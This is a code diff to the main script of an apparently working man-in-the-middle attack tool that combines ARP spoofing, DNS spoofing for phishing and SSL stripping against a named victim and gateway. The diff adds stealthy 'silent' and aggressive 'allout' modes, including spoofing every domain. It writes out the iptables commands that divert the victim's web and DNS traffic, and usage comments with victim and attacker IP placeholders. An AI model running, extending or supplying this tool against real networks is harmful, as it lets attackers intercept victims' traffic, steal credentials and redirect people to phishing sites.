@@ -28,17 +28,36 @@ def main():
     args = parser.parse_args()
 
 
+    # Operational parameters
     arp_interval = 2
     verbose = True
+    dns_spoof_all = False
+    ssl_active_stripping = True
 
     if args.op_mode == "silent":
-        print("[*] Running in SILENT mode. Minimal console output.")
+        print("[*] Configuration: SILENT MODE")
+        print("- ARP: Slow interval (5s)")
+        print("- DNS: Targeted domain spoofing")
+        print("- SSL: Passive monitoring ")
+
         arp_interval = 5
         verbose = False
+        dns_spoof_all = False
+        ssl_active_stripping = False
+
+        sslstrip.set_log_mode(silent=True)
+
     elif args.op_mode == "allout":
-        print("[*] Running in ALLOUT mode. Aggressive logging enabled.")
+        print("[*] Configuration: ALL-OUT MODE")
+        print("- ARP: Fast interval (1s)")
+        print("- DNS: Spoof ALL domains")
+        print("- SSL: Active stripping ")
+
         arp_interval = 1
         verbose = True
+        dns_spoof_all = True
+        ssl_active_stripping = True
+    
 
     if args.mode == "dns" and not args.attacker:
         print("[-] Attacker IP is required for DNS spoofing mode.")
@@ -85,22 +104,33 @@ def main():
             os.system("sudo iptables -A FORWARD -p udp --dport 53 -j DROP")
             dns_thread = threading.Thread(
                 target=dns.start_dns_spoof,
-                args=(args.target_domain, args.attacker, verbose),
+                args=(args.target_domain, args.attacker, verbose, dns_spoof_all),
                 daemon=True
             )
             dns_thread.start()
 
         # Start SSL Stripping if enabled
         elif args.mode == "ssl":
-            # iptables rules to catch requests & responses
-            os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0")
-            os.system("iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 0")
-            sslstrip_thread = threading.Thread(
-                target=sslstrip.start_sslstrip_netfilter,
-                args=(0,),
-                daemon=True
-            )
-            sslstrip_thread.start()
+            if ssl_active_stripping:
+                print("[*] Starting ACTIVE SSL Stripping...")
+                # iptables rules to catch requests & responses
+                os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0")
+                os.system("iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 0")
+                sslstrip_thread = threading.Thread(
+                    target=sslstrip.start_sslstrip_netfilter,
+                    args=(0,),
+                    daemon=True
+                )
+                sslstrip_thread.start()
+            else:
+                print("[*] Starting PASSIVE SSL Sniffing...")
+                sslstrip_thread = threading.Thread(
+                    target=sslstrip.start_sslstrip_sniff,
+                    args=(args.interface,),
+                    daemon=True
+                )
+                sslstrip_thread.start()
+
 
         while True:
             time.sleep(1)
@@ -109,7 +139,7 @@ def main():
         print("\n[+] Stopping ARP Spoofing. Restoring network...")
         arp.restore(args.victim, victim_mac, args.gateway, gateway_mac)
 
-        # 5. Disable Interfaces 
+        # Disable Interfaces 
         if args.mode == "dns":
             print("[-] Removing DNS DROP rule...")
             os.system("iptables -D FORWARD -p udp --dport 53 -j DROP")
@@ -132,8 +162,8 @@ if __name__ == "__main__":
 # You need the victim IP, gateway IP, and attacker IP
 # The attack can be run in three modes: ARP Spoofing mode, Phising mode (DNS Spoofing), or MITM mode (SSL Stripping)
 # For ARP Spoofing mode:
-# sudo python3 main.py --mode arp --victim <VICTIM_IP> --gateway <GATEWAY_IP>
+# sudo python3 main.py --mode arp --victim <VICTIM_IP> --gateway <GATEWAY_IP> --op-mode <silent|allout|default>
 # For Phising (DNS Spoofing) mode:
-# sudo python3 main.py --mode dns --victim <VICTIM_IP> --gateway <GATEWAY_IP> --attacker <ATTACKER_IP> --target-domain <TARGET_DOMAIN>
+# sudo python3 main.py --mode dns --victim <VICTIM_IP> --gateway <GATEWAY_IP> --attacker <ATTACKER_IP> --target-domain <TARGET_DOMAIN> --op-mode <silent|allout|default>
 # For MITM (SSL Stripping) mode:
-# sudo python3 main.py --mode ssl --victim <VICTIM_IP> --gateway <GATEWAY_IP> --interface <NETWORK_INTERFACE>
+# sudo python3 main.py --mode ssl --victim <VICTIM_IP> --gateway <GATEWAY_IP> --interface <NETWORK_INTERFACE> --op-mode <silent|allout|default>
